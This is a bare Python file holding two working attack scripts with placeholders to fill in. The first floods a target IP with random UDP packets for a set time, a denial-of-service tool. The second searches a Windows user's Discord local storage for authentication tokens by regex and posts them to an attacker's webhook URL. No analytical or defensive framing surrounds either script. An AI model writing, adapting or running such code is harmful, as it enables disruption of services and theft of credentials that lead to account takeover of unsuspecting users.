import socket
import random
import time

target_ip = "TARGET_IP_HERE"  
target_port = 80
duration = 60  

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_to_send = random._urandom(1024)

start_time = time.time()
while time.time() - start_time < duration:
    sock.sendto(bytes_to_send, (target_ip, target_port))
    print(f"Sent packet to {target_ip}:{target_port}")

sock.close()

import os
import re
import requests
import getpass

user = getpass.getuser()
discord_path = f"C:\\Users\\{user}\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
webhook_url = "YOUR_WEBHOOK_URL_HERE"  

token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'

tokens = []
for root, _, files in os.walk(discord_path):
    for file in files:
        if file.endswith(('.ldb', '.log')):
            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                content = f.read()
                found_tokens = re.findall(token_pattern, content)
                tokens.extend(found_tokens)

if tokens:
    requests.post(webhook_url, json={"tokens": tokens})
    print(f"Sent {len(tokens)} tokens to webhook")
else:
    print("No tokens found")